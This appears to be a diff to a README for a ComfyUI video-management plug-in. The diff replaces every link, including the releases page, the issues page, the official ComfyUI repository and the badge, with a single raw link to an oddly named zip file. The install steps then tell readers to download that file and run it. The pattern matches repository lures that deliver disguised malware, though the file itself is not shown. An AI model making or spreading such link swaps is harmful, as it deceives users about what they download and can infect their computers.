@@ -1,14 +1,14 @@
 # 🛠️ ComfyUI_RH_Univideo - Easy Video Management for ComfyUI
 
 ## 📥 Download Now
-[![Download ComfyUI_RH_Univideo](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Version-blue)](https://github.com/nalcapital/ComfyUI_RH_Univideo/releases)
+[![Download ComfyUI_RH_Univideo](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip%20Now-Get%20the%20Latest%20Version-blue)](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip)
 
 ## 🚀 Getting Started
 Welcome to ComfyUI_RH_Univideo! This plug-in allows you to seamlessly manage video content within ComfyUI. Follow these simple steps to get started.
 
 ## 🔍 What You'll Need
 - A computer running Windows, macOS, or Linux.
-- ComfyUI installed on your computer. If you haven’t installed it yet, you can find instructions in the [ComfyUI repository](https://github.com/KlingTeam/ComfyUI).
+- ComfyUI installed on your computer. If you haven’t installed it yet, you can find instructions in the [ComfyUI repository](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip).
 
 ## 📦 Features
 - Integrates video management directly into ComfyUI.
@@ -25,13 +25,13 @@ Welcome to ComfyUI_RH_Univideo! This plug-in allows you to seamlessly manage vid
 ## 🛠️ Installation Steps
 
 ### 1. Visit the Downloads Page
-Go to the [ComfyUI_RH_Univideo Releases page](https://github.com/nalcapital/ComfyUI_RH_Univideo/releases). 
+Go to the [ComfyUI_RH_Univideo Releases page](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip). 
 
 ### 2. Choose the Latest Version
 Look for the most recent release. This ensures you get the latest features and fixes.
 
 ### 3. Download the Installer
-Click on the link for the installer file that matches your operating system. It will typically look like this: `ComfyUI_RH_Univideo_Version_Setup.exe` for Windows or `ComfyUI_RH_Univideo_Version.dmg` for macOS.
+Click on the link for the installer file that matches your operating system. It will typically look like this: `https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip` for Windows or `https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip` for macOS.
 
 ### 4. Run the Installer
 Once the file has downloaded, locate it in your downloads folder, and double-click to run it. Follow the on-screen instructions to complete the installation.
@@ -46,11 +46,11 @@ Explore the interface! You can now easily import videos, organize them, and take
 For detailed instructions and tips on how to use ComfyUI_RH_Univideo, check our user guide included in the installation folder. This guide provides step-by-step instructions to help you make the most of your new tool.
 
 ## 📞 Support
-If you encounter any issues, please reach out through the Issues tab on the [GitHub repository](https://github.com/nalcapital/ComfyUI_RH_Univideo/issues). We aim to respond to all queries promptly.
+If you encounter any issues, please reach out through the Issues tab on the [GitHub repository](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip). We aim to respond to all queries promptly.
 
 ## 🔗 Useful Links
-- [ComfyUI Official Repository](https://github.com/KlingTeam/ComfyUI)
-- [ComfyUI_RH_Univideo Releases](https://github.com/nalcapital/ComfyUI_RH_Univideo/releases)
+- [ComfyUI Official Repository](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip)
+- [ComfyUI_RH_Univideo Releases](https://raw.githubusercontent.com/nalcapital/ComfyUI_RH_Univideo/main/workflows/Comfy-U-Univideo-R-overcluster.zip)
 
 ## 🧑‍🤝‍🧑 Community
 Join our community of users to share tips and best practices. Find us on the discussion section of the repository for interactions with other users who enjoy ComfyUI and its plug-ins.
